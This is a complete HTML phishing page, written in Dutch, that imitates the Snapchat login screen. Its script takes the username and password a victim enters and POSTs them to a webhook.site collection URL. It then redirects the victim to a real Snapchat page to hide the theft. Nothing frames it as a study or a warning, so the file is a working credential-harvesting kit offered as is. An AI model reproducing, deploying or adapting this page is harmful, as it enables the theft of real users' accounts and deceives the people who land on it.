<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #FFFC00;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.15);
            width: 360px;
            text-align: center;
        }
        .logo {
            width: 80px;
            height: 80px;
            background: #FFFC00;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 40px;
        }
        .ghost { font-size: 50px; line-height: 80px; }
        h1 { color: #333; margin-bottom: 8px; font-size: 24px; }
        .subtitle { color: #666; margin-bottom: 24px; font-size: 14px; }
        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 12px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
            transition: border 0.2s;
        }
        input:focus { border-color: #FFFC00; }
        button {
            width: 100%;
            padding: 14px;
            background: #FFFC00;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            color: #333;
            cursor: pointer;
            margin-top: 8px;
        }
        button:hover { background: #f2e900; }
        .footer { margin-top: 20px; font-size: 12px; color: #999; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <span class="ghost">👻</span>
        </div>
        <h1>Log in</h1>
        <p class="subtitle">Log in om Snapchat te gebruiken</p>
        <form id="loginForm">
            <input type="text" id="username" name="username" placeholder="Gebruikersnaam of e-mail" required>
            <input type="password" id="password" name="password" placeholder="Wachtwoord" required>
            <button type="submit">Log in</button>
        </form>
        <div class="footer">Nog geen account? <a href="#">Aanmelden</a></div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Data ophalen
            const data = {
                username: document.getElementById('username').value,
                password: document.getElementById('password').value
            };
            
            // Versturen naar Webhook.site
            fetch('https://webhook.site/edc9ee44-326a-4cd4-9dc4-34ac54df77bd', {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });
            
            // Direct doorsturen naar echte Snapchat
            window.location.href = 'https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYdXJhbnhuaHBkAZ14D-ceAZ14DeB5AAAAAQ?ref=web_spotlight';
        });
    </script>
</body>
</html>
